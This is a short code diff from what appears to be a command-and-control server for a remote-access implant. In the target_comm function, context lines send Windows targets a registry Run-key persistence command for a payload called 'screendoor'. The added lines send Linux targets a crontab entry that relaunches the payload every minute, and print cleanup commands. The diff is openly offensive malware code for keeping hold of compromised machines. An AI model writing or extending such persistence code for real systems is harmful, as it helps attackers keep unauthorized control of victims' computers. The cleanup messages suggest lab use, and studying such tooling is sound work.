@@ -62,6 +62,11 @@ def target_comm(targ_id, targets, num):
                 persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                 targ_id.send(persist_command_2.encode())
                 print('[!] Run this command to clean up the registry: \n reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v screendoor /f')
+            if targets[num][6] == 2:
+                persist_command = f"echo '*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}' | crontab -"
+                targ_id.send(persist_command.encode())
+                print ('[!] Run this command to clean up the crontab: \n crontab -r')
+            print('[!] Persistence has been established.')
         else:
             response = comm_in(targ_id)
             if response == 'exit':
